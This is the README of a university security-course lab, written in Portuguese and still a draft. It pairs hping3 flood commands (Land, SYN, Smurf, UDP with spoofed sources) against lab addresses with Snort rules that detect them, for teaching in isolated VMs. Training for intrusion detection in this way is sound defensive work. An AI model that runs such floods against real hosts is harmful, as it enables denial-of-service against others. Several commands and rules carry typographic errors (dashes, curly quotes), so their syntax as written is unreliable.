# IDS-DDoS-Sim

Repositório para a prática de Detecção de Intrusão sob ataques de Negação de Serviço Distribuídos (DDoS).

A motivação da criação desse repositório é ser um instrumento práticas de laboratório e de avaliação para a disciplina de Segurança Computacional, ofertada pelo Departamento de Informática da Universidade Federal do Espírito Santo (UFES).

## Laboratório Virtual

Nesse repositório é oferecido um ambiente controlado e isolado para a simulação dos ataques.

Foi levado em consideração a criação de um *Passo a Passo* para usuários que possuem diferentes Sistemas Operacionais. Entretando, o grupo que criou esse repositório realizou os testes em computadores com o sistema operacional baseado em GNU/Linux.

### Estrutura do Laboratório Virtual

Após o processo de instalação, o usuário poderá verificar a seguinte estrutura de máquinas virtuais:
inserir figura

## Preparação do Laboratório Virtual:
#### Pré-Requisitos:

> Nesta lista, estão citadas as aplicações utilizadas no projeto. Porém, fica a critério do usuário optar por outras apliacações de sua preferência.

- Virtual Box[^1]: https://www.virtualbox.org/
- Vagrant[^2]: https://www.vagrantup.com/
- Snort: https://www.snort.org/
- Hping3: https://www.kali.org/tools/hping3/


### Instalação do Virtualbox e do Vagrant:

- [Para usários de Linux]: (inserir link)
- [Para usuários de Windows]: (inserir link)
- [Para usuários de MacOS]: (inserir link)

### Preparação do Laboratório:

- [Sem o *Vagrantfile]: (inserir link)
- [Com o *Vagrantfile]: (inserir link)

## Simulações:

### Realizando Ataques de Negação de Serviço Distribuído e Detectando-os:

### Land Attack

- Hping3: 

`$ sudo hping3 -S 10.0.0.10 -a 10.0.0.10 -k -s 80 -p 80 –flood`

- Snort Rule:

`alert tcp $HOME_NET 80 <> $HOME_NET 80 (msg:”LAND ATTACK DETECTED”;sid:10000009;rev:3;)`

### SYN Flood Attack

- Hping3: 

`$ sudo hping3 — rand-source 10.0.0.10 -p 80 -S –flood`

- Snort Rule: 

`alert tcp any any -> $HOME_NET 80 (threshold: type threshold, track by_dst, count 20, seconds 60; msg: “Possible TCP SYN Flood attack detected”; sid: 10000009; rev: 1;)`

### Smurf Attack

- Hping3: 

`$ sudo hping3 -1 — icmptype 8 — icmpcode 0 -k — flood -a 10.0.0.10 192.168.0.255`

- Snort Rule:

`alert icmp $HOME_NET any -> 192.168.0.255 any (threshold: type threshold, track by_src, count 20, seconds 60;msg:”SMURF FLOODING ATTACK DETECTED”;sid:100000023;rev:1;)`
    
### UDP Flood Attack:

- Hping3: 
`$ sudo hping3 -2 — flood — rand-source -p 53 10.0.0.10`

- Snort Rule: 
`alert udp any any -> $HOME_NET 53 (threshold: type threshold, track by_src, count 10, seconds 60; msg:”UDP FLOODING ATTACK”;sid:10000007;rev:2;)`



[^1]: O usuário pode optar, de acordo com a sua preferência, por outros aplicativos para criar as Máquinas Virtuais.
[^2]: Nesse repositório é oferecido um script *Vagrantfile* com o objetivo de criar o laboratório virtual com todas aplicações e dependencias já instaladas. Entretanto, o uso do Vargrant é facultativo.
